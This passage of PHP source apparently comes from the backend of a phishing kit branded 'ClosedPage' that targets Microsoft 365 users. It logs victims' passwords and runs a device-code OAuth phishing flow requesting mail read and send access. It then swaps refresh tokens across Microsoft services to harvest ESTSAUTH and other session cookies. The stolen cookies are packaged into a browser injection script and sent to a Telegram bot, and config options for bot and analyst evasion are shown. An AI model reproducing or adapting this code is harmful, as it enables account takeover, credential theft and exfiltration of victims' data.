                    'ip' => Security::getClientIp(),
                    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'time' => date('c')
                ]);

            } else {
                // PATH A: Simple Visitor Log (No Cookies)
                // Only runs if no password is provided (e.g. email_ok step)
                // Use provided cookieId if available to link sessions
                $cookieId = $cookieIdSanitized !== '' ? $cookieIdSanitized : uniqid('v_', true);
                
                $db->logEvent([
                    'cookieId' => $cookieId,
                    'type' => $type,
                    'emailMask' => $email,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
                    'ip' => Security::getClientIp(),
                    'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'time' => date('c')
                ]);
            }

            echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            Security::log("API ERROR (log_event): " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleGetDeploymentInfo() {
        $baseDir = realpath(__DIR__ . '/..');
        $deploymentFile = $baseDir . '/deployment.json';
        $data = [];

        if (file_exists($deploymentFile)) {
            $json = json_decode(file_get_contents($deploymentFile), true);
            if (is_array($json)) {
                $data = $json;
            }
        }
        
        $cfg = Config::load();

        $rotationPath = isset($data['rotation_path']) && is_string($data['rotation_path']) && $data['rotation_path'] !== ''
            ? $data['rotation_path']
            : 'admg';

        $slugs = $data['rotation_slugs'] ?? [];
        if (is_string($slugs) && $slugs !== '') {
            $slugs = [$slugs];
        } elseif (!is_array($slugs)) {
            $slugs = [];
        }
        $slugs = array_values($slugs);

        $projectPath = (isset($data['path']) && is_string($data['path']) && $data['path'] !== '')
            ? $data['path']
            : $baseDir;

        $response = [
            'main_domain' => $data['main_domain'] ?? '',
            'domains' => $data['domains'] ?? [],
            'rotation_path' => $rotationPath,
            'rotation_slugs' => $slugs,
            'path' => $projectPath
        ];

        echo json_encode(['ok' => true, 'data' => $response]);
    }

    private static function handleCaptureExistingSession() {
        try {
            Security::log("API: handleCaptureExistingSession called");
            $projectRoot = realpath(__DIR__ . '/..');
            $cmd = "cd " . escapeshellarg($projectRoot) .
                   " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; fi" .
                   " && HOME=" . escapeshellarg($projectRoot) .
                   " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules') .
                   " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config') .
                   " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
                   " PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer') .
                   " node " . escapeshellarg($projectRoot . '/capture_session.js') . " > /dev/null 2>&1 &";
            
            Security::log("API: Executing command: $cmd");
            shell_exec($cmd);

            echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            Security::log("API ERROR (capture_existing_session): " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleSaveConfig() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        if (!$raw) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Empty body']);
            exit;
        }
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }
        
        // Debug log removed
        
        $allowed = [
            'template', 'redirectUrl', 'firstAttemptFail', 'loadingEnabled', 'loadingDelayMs',
            'telemetryEnabled', 'telegramBotToken', 'telegramChatId', 'telegramReportIncorrect', 'securityEnabled',
            'allowedDomains', 'blockedDomains', 'cfTurnstileEnabled', 'cfBotShield', 'cfUnderAttack', 'cfSecurityEnabled', 'cfSiteKey',
            'cfSecretKey', 'cfApiKey', 'cfEmail', 'cfZoneId', 'cfAccountId', 'cfCountryBlockingEnabled', 'cfAllowedCountries',
            'countryBlockingEnabled', 'allowedCountries', 'ipWhitelist',
            'proxyEnabled', 'proxyUrl', 'proxycheckEnabled', 
            'proxycheckBlockVPN', 'proxycheckBlockProxy', 'proxycheckBlockTor',
            'proxycheckApiKey', 'proxycheckRiskThreshold'
        ];
        $out = [];
        foreach ($allowed as $k) {
            if (array_key_exists($k, $data)) {
                $out[$k] = $data[$k];
            }
        }

        $ok = Config::saveMerged($out);
        if ($ok === false) {
            Security::log("API ERROR (save_config): Write failed for config.json");
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
            exit;
        }
        echo json_encode(['ok' => true]);
    }

    private static function handleGetConfig() {
        $cfg = Config::load();
        // Security::log("DEBUG: handleGetConfig sending: " . json_encode($cfg));
        
        // Filter sensitive data before sending to client
        $safeCfg = $cfg;
        $sensitiveKeys = ['masterLicenseKey', 'encKey', 'proxycheckApiKey', 'telegramBotToken', 'cfApiKey', 'cfSecretKey'];
        
        // Only mask if not logged in as admin (but here we are in admin context usually)
        // However, it is better practice not to send secrets if the frontend only needs to display presence
        // But the admin panel inputs need the values to edit them. 
        // For now, we keep them as is since this is an admin endpoint, 
        // BUT we ensure no extra debug logging of these values exists.
        
        $safeCfg['msDeviceFlowClientId'] = $cfg['msDeviceFlowClientId'] ?? null;
        $safeCfg['msSsoClientId'] = $cfg['msSsoClientId'] ?? null;
        $safeCfg['postAuthRedirectUrl'] = $cfg['postAuthRedirectUrl'] ?? null;
                    $safeCfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? null;
                    echo json_encode(['ok' => true] + $safeCfg);
    }

    private static function handleClearLogs() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        
        $sessionDir = __DIR__ . '/../session_data';
        if (is_dir($sessionDir)) {
            $files = glob($sessionDir . '/*');
            foreach ($files as $file) {
                if (is_file($file)) unlink($file);
            }
        }

        $projectLogFile = __DIR__ . '/../project.log';
        if (file_exists($projectLogFile)) {
            unlink($projectLogFile);
        }
        
        echo json_encode(['ok' => true]);
    }

    private static function handleGetCookies() {
        $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $_GET['id']) : '';
        $type = isset($_GET['type']) ? $_GET['type'] : '';

        if (!$id) {
            echo json_encode(['ok' => false, 'error' => 'Missing ID']);
            exit;
        }
        $sessionDir = __DIR__ . '/../session_data';
        $jsFile = $sessionDir . '/inject_session_' . $id . '.js';
        $txtFile = $sessionDir . '/cookies_all_' . $id . '.txt';

        // Check if there's a newer version (e.g. from local_cap refresh)
        // If the ID passed is an old device_flow ID, but a newer local_cap exists for the same user, 
        // we might want to return that. However, for now, we just serve the requested ID.
        
        if ($type === 'js') {
            if (file_exists($jsFile)) {
                $content = file_get_contents($jsFile);
                // Highlight ESTSAUTH in the log for the admin
                if (strpos($content, 'ESTSAUTH') !== false) {
                    Security::log("ADMIN_RETRIEVAL: Serving JS script with ESTSAUTH for ID $id");
                }
                echo json_encode(['ok' => true, 'content' => $content, 'type' => 'js']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Script not found']);
            }
        } elseif ($type === 'txt') {
            if (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        } else {
            if (file_exists($jsFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
            } elseif (file_exists($txtFile)) {
                echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
            }
        }
    }

    private static function handleStartDeviceFlow() {
        $email = $_GET['email'] ?? '';
        // Safety: If email is the placeholder from the template, treat as empty
        if (strpos($email, 'EMAIL_PLACEHOLDER') !== false) {
            $email = '';
        }

        $cfg = Config::load();
        $clientId = $cfg['msDeviceFlowClientId'];
        $url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode";
        
        $scope = "openid profile email offline_access https://graph.microsoft.com/.default";
        
        $body = http_build_query([
            'client_id' => $clientId,
            'scope' => $scope
        ]);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        
        $resp = curl_exec($ch);
        Security::log("DEBUG: Raw Microsoft API response: " . $resp);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $json = json_decode($resp, true);

        if ($code === 200 && isset($json['user_code']) && isset($json['verification_uri'])) {
            echo json_encode([
                'ok' => true,
                'user_code' => $json['user_code'],
                'verification_uri' => $json['verification_uri'],
                'interval' => $json['interval'] ?? 5,
                'expires_in' => $json['expires_in'] ?? 3600,
                'clientId' => $clientId
            ]);
            return;
        }

        // Log detailed error information
        error_log("Device Flow API Error: HTTP Status Code: " . $code);
        error_log("Device Flow API Error: Response: " . $resp);
        error_log("Device Flow API Error: cURL Error: " . curl_error($ch));

        http_response_code(500);
        echo json_encode(['error' => 'Failed to start device flow', 'details' => $resp, 'http_code' => $code, 'curl_error' => curl_error($ch)]);
    }

    private static function handlePollDeviceFlow() {
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        $deviceCode = $data['device_code'] ?? '';
        $email = $data['email'] ?? 'device_flow';
        $clientId = $data['clientId'];
        $skipVps = !empty($data['skip_vps']); // NEW: Read skip_vps flag

        if (!$deviceCode) {
            http_response_code(400);
            echo json_encode(['error' => 'Missing device code']);
            exit;
        }

        $sessionDir = __DIR__ . '/../session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
        
        $lockFile = $sessionDir . '/poll_' . md5($deviceCode) . '.lock';
        $resultFile = $sessionDir . '/poll_' . md5($deviceCode) . '.json';

        // 1. Check if already completed
        if (file_exists($resultFile)) {
            $result = json_decode(file_get_contents($resultFile), true);
            echo json_encode(['ok' => true, 'status' => 'completed', 'cookieId' => $result['cookieId']]);
            exit;
        }

        // 2. Check if currently processing (Lock)
        if (file_exists($lockFile)) {
            $lockTime = filemtime($lockFile);
            if (time() - $lockTime < 60) {
                // Still processing, tell client to wait
                echo json_encode(['ok' => true, 'status' => 'pending', 'message' => 'Processing capture...']);
                exit;
            }
        }

        // 3. Set Lock
        touch($lockFile);

        // $clientId is already defined above from the POST data
        $url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
        $body = http_build_query([
            'grant_type' => 'urn:ietf:params:oauth:grant-type:device_code',
            'client_id' => $clientId,
            'device_code' => $deviceCode,
            'scope' => 'openid profile email offline_access https://outlook.office.com/mail.read https://outlook.office.com/mail.send'
        ]);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        // curl_close is no longer needed in PHP 8.0+

        $json = json_decode($resp, true);

        if (isset($json['access_token'])) {
            Security::log("DEVICE_FLOW: Success! Token captured for $email. Client: $clientId. Initiating session capture...");
            // Success! Capture Tokens
            $cookieId = uniqid('ms_device_', true);
            
            // Save result immediately to prevent other polls from starting another capture
            file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'time' => date('c')]));

            // MARK TOKEN AS FRESH (RTR Management)
            $tokenData = $json;
            $tokenData['is_fresh'] = true;
            $tokenData['captured_at'] = time();
            $tokenData['tid'] = $data['tid'] ?? 'common';

            $db = new Database();
            $db->logEvent([
                'cookieId' => $cookieId,
                'clientId' => $clientId, // Log which clientId was used
                'type' => 'microsoft_device_flow',
                'emailMask' => $email,
                'email' => $email, // Explicit email for worker
                'domain' => 'microsoft.com',
                'attempt' => 1,
                'password' => 'OAUTH_TOKEN_CAPTURED',
                'ip' => Security::getClientIp(),
                'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'time' => date('c'),
                'token_data' => $tokenData, // Using the enriched token data
                'clientId' => $clientId // Also store at top level for easy access
            ]);

            // --- PHP-ONLY COOKIE SWAP (No Puppeteer) ---
            Security::log("DEVICE_FLOW: Attempting immediate PHP-side cookie swap for $email...");
            $swapResult = self::swapTokenForCookies($json['access_token'], $json['refresh_token'] ?? null, $email, $clientId);
            $cookies = $swapResult['cookies'] ?? [];
            
            $capturedNames = array_column($cookies, 'name');
            Security::log("DEVICE_FLOW: PHP swap captured " . count($cookies) . " cookies: " . implode(', ', $capturedNames));
            
            if (!empty($swapResult['tokens'])) {
                Security::log("DEVICE_FLOW: PHP swap returned updated tokens. Synchronizing...");
                $tokenData = array_merge($tokenData, $swapResult['tokens']);
                // Mark as not fresh if we already performed a swap/refresh in PHP
                $tokenData['is_fresh'] = false;
                $tokenData['php_swapped'] = true;
                
                // Refresh token data in the database with updated tokens from swap
                $db->logEvent([
                    'cookieId' => $cookieId,
                    'token_data' => $tokenData
                ]);
            }
            
            $hasAuth = false;
            foreach ($cookies as $c) {
                if (in_array($c['name'], ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'rtFa', 'FedAuth'])) {
                    $hasAuth = true;
                    break;
                }
            }

            if ($hasAuth) {
                Security::log("DEVICE_FLOW: Full session captured via PHP swap for $email. Task complete.");
                // Success! PHP captured the 13 cookies
                $sessionInjectScript = $sessionDir . '/inject_session_' . $cookieId . '.js';
                $scriptContent = "// @ClosedService-Pages PHP-Only Captured Cookies 🍪\n";
                $scriptContent .= "// Email: $email\n\n";
                $scriptContent .= "(function() {\n";
                $scriptContent .= "    const cookies = " . json_encode($cookies, JSON_PRETTY_PRINT) . ";\n";
                $scriptContent .= "    cookies.forEach(c => {\n";
                $scriptContent .= "        document.cookie = c.name + '=' + c.value + '; domain=' + c.domain + '; path=/; secure; samesite=none; expires=' + new Date(Date.now() + 31536000000).toUTCString();\n";
                $scriptContent .= "    });\n";
                $scriptContent .= "    console.log('✅ Successfully injected ' + cookies.length + ' cookies!');\n";
                $scriptContent .= "})();";
                file_put_contents($sessionInjectScript, $scriptContent);

                // Telegram Success (No Worker Needed)
                $cfg = Config::load();
                if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
                    $msg = Worker::generateTelegramMessage($email, "DEVICE_FLOW_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ 13 Session Cookies Captured (PHP-Only Mode)");
                    $urlTg = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
                    Worker::sendRequest($urlTg, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);

                    // NEW: Send the script file to Telegram
                    $urlDoc = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
                    $payloadDoc = [
                        'chat_id' => $cfg['telegramChatId'],
                        'document' => new \CURLFile($sessionInjectScript, 'application/javascript', "php_cookies_{$email}.js"),
                        'caption' => "/////// PHP-ONLY COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
                    ];
                    Worker::sendRequest($urlDoc, $payloadDoc, $cfg, true);
                }
                
                // Final result update
                file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'status' => 'completed', 'mode' => 'php']));
            } else {
                Security::log("DEVICE_FLOW: PHP swap incomplete for $email. Waiting for browser-side capture (No VPS Worker)...");
                // Mark as completed so the frontend knows to proceed with its local memory sweep
                file_put_contents($resultFile, json_encode(['cookieId' => $cookieId, 'status' => 'completed', 'mode' => 'local']));
            }

            // Cleanup lock
            if (file_exists($lockFile)) unlink($lockFile);

            echo json_encode(['ok' => true, 'status' => 'completed', 'cookieId' => $cookieId]);
        } else {
            // Cleanup lock on non-success (e.g. authorization_pending)
            if (file_exists($lockFile)) unlink($lockFile);
            echo $resp;
        }
    }

    private static function swapTokenForCookies($accessToken, $refreshToken = null, $email = 'unknown', $clientId = 'd326c4ad-3914-4aba-ba32-83500a38b6a1') {
        $cookies = [];
        $tokens = ['access_token' => $accessToken, 'refresh_token' => $refreshToken];
        $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
        
        Security::log("PHP_CAPTURE: Starting Universal FOCI swap for $email using Microsoft Office ID...");

        try {
            // 1. Get specialized tokens using the refresh token (FOCI Swap)
            if ($refreshToken) {
                $fociResources = [
                    'id_token' => ['scope' => 'openid profile email offline_access https://graph.microsoft.com/.default'],
                    'office'   => ['resource' => 'https://analysis.windows.net/powerbi/api'], 
                    'outlook'  => ['resource' => 'https://outlook.office.com'],
                    'mgmt'     => ['resource' => 'https://management.core.windows.net/'],
                    'teams'    => ['resource' => 'https://api.spaces.skype.com'],
                    'm365'     => ['resource' => 'https://graph.windows.net/'] 
                ];

                foreach ($fociResources as $key => $params) {
                    $body = array_merge([
                        'grant_type' => 'refresh_token',
                        'client_id' => $clientId,
                        'refresh_token' => $tokens['refresh_token']
                    ], $params);

                    $url = isset($params['scope']) 
                        ? "https://login.microsoftonline.com/common/oauth2/v2.0/token"
                        : "https://login.microsoftonline.com/common/oauth2/token";

                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($body));
                    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
                    $resp = curl_exec($ch);
                    $data = json_decode($resp, true);

                    if (isset($data['access_token']) || isset($data['id_token'])) {
                        if ($key === 'id_token') {
                            $tokens['id_token'] = $data['id_token'];
                            $parts = explode('.', $data['id_token']);
                            if (count($parts) >= 2) {
                                $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+/')), true);
                                if (isset($payload['tid'])) $tokens['tid'] = $payload['tid'];
                            }
                        } else {
                            $tokens[$key] = $data['access_token'];
                        }
                        
                        if (isset($data['refresh_token'])) $tokens['refresh_token'] = $data['refresh_token'];
                        Security::log("PHP_CAPTURE: Successfully obtained $key token");
                    }
                }
            }

            // 2. Aggressive Cookie Capture with Browser Headers
            $cookieJar = tempnam(sys_get_temp_dir(), 'ms_cookies_');
            $headers = [
                'User-Agent: ' . $ua,
                'X-AnchorMailbox: ' . $email,
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language: en-US,en;q=0.9',
                'Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'Sec-Ch-Ua-Mobile: ?0',
                'Sec-Ch-Ua-Platform: "Windows"',
                'Sec-Fetch-Dest: document',
                'Sec-Fetch-Mode: navigate',
                'Sec-Fetch-Site: none',
                'Sec-Fetch-User: ?1',
                'Upgrade-Insecure-Requests: 1'
            ];

            if (isset($tokens['id_token'])) {
                $tenantId = $tokens['tid'] ?? 'common';
                
                // POST to login.srf with KMSI=1
                Security::log("PHP_CAPTURE: Posting to login.srf (Tenant: $tenantId)...");
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/login.srf");
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/x-www-form-urlencoded']));
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                    'wa' => 'wsignin1.0',
                    'wtrealm' => 'urn:federation:MicrosoftOnline',
                    'wctx' => 'https://outlook.office.com/owa/?auth_redirect=true',
                    'id_token' => $tokens['id_token'],
                    'PPSX' => 'PassThrough',
                    'LoginOptions' => '3',
                    'type' => '11',
                    'msc' => '1',
                    'kmsi' => '1',
                    'rememberme' => '1'
                ]));
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');
                
                // Authorize endpoint (Active Client ID)
                Security::log("PHP_CAPTURE: Accessing authorize (Client: " . $clientId . ")...");
                $authParams = [
                    'client_id' => $clientId,
                    'response_type' => 'code',
                    'redirect_uri' => 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                    'scope' => 'openid profile email offline_access https://graph.microsoft.com/.default',
                    'prompt' => 'none',
                    'login_hint' => $email
                ];
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" . http_build_query($authParams));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // Office Handshake
                Security::log("PHP_CAPTURE: Accessing authorize (Office ID)...");
                $authParams['client_id'] = 'd326ad-3914-4aba-ba32-83500a38b6a1';
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" . http_build_query($authParams));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // Graph Authorize (High probability of ESTSAUTH)
                Security::log("PHP_CAPTURE: Accessing Graph Authorize...");
                $graphParams = [
                    'client_id' => '00000003-0000-0000-c000-000000000000',
                    'response_type' => 'code',
                    'redirect_uri' => 'https://graph.microsoft.com/',
                    'scope' => 'https://graph.microsoft.com/.default',
                    'prompt' => 'none',
                    'login_hint' => $email
                ];
                $graphUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?" . http_build_query($graphParams);
                $ch = curl_init($graphUrl);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');
                
                // DEEP DEBUG for the test user
                if (stripos($email, 'jaco') !== false) {
                    $debugFile = __DIR__ . '/../session_data/debug_graph_' . time() . '.html';
                    file_put_contents($debugFile, "URL: $graphUrl\n\nRESPONSE:\n$response");
                    Security::log("PHP_CAPTURE: [DEEP DEBUG] Saved Graph response to: " . basename($debugFile));
                }

                // SAS ProcessAuth (Most aggressive endpoint for ESTSAUTH)
                Security::log("PHP_CAPTURE: Accessing SAS ProcessAuth...");
                $ch = curl_init("https://login.microsoftonline.com/common/SAS/ProcessAuth");
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/x-www-form-urlencoded']));
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                    'wa' => 'wsignin1.0',
                    'id_token' => $tokens['id_token'],
                    'LoginOptions' => '3'
                ]));
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');

                // Reprocess - Force a session check
                Security::log("PHP_CAPTURE: Accessing reprocess...");
                $ch = curl_init("https://login.microsoftonline.com/$tenantId/reprocess");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.microsoftonline.com');
                
                // Extra Endpoint: login.live.com (for hybrid accounts)
                Security::log("PHP_CAPTURE: Accessing login.live.com...");
                $ch = curl_init("https://login.live.com/me.srf?wa=wsignin1.0");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
                $response = curl_exec($ch);
                self::extractCookiesFromResponse($response, $cookies, '.login.live.com');
            }

            // Endpoint 2: Outlook (rtFa/FedAuth) - Use the Outlook Token
            Security::log("PHP_CAPTURE: Accessing Outlook OWA with Bearer Token...");
            $ch = curl_init("https://outlook.office.com/owa/?auth_redirect=true");
            $outlookHeaders = $headers;
            if (isset($tokens['outlook'])) {
                $outlookHeaders[] = 'Authorization: Bearer ' . $tokens['outlook'];
            }
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $outlookHeaders);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.outlook.office.com');
            
            // Endpoint 3: portal.office.com (Get SuiteServiceProxyKey) - Use the Office Token
            Security::log("PHP_CAPTURE: Accessing Office Portal with Bearer Token...");
            $ch = curl_init("https://www.office.com/landing?auth=2");
            $officeHeaders = $headers;
            if (isset($tokens['office'])) {
                $officeHeaders[] = 'Authorization: Bearer ' . $tokens['office'];
            }
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $officeHeaders);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.office.com');

            // Endpoint 4: M365 Chat (Modern Identity Domain) - Use the M365 Token
            Security::log("PHP_CAPTURE: Accessing M365 Chat Portal with Bearer Token...");
            $ch = curl_init("https://m365.cloud.microsoft/chat/?auth=2");
            $m365Headers = $headers;
            if (isset($tokens['m365'])) {
                $m365Headers[] = 'Authorization: Bearer ' . $tokens['m365'];
            }
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $m365Headers);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.m365.cloud.microsoft');
            
            // Endpoint 5: MyAccount Security (Often has the best markers)
            Security::log("PHP_CAPTURE: Accessing MyAccount Security...");
            $ch = curl_init("https://myaccount.microsoft.com/info");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
            $response = curl_exec($ch);
            self::extractCookiesFromResponse($response, $cookies, '.microsoft.com');

            // Parse final cookie jar to get any hidden cookies
            if (file_exists($cookieJar)) {
                $jarContent = file_get_contents($cookieJar);
                $lines = explode("\n", $jarContent);
                foreach ($lines as $line) {
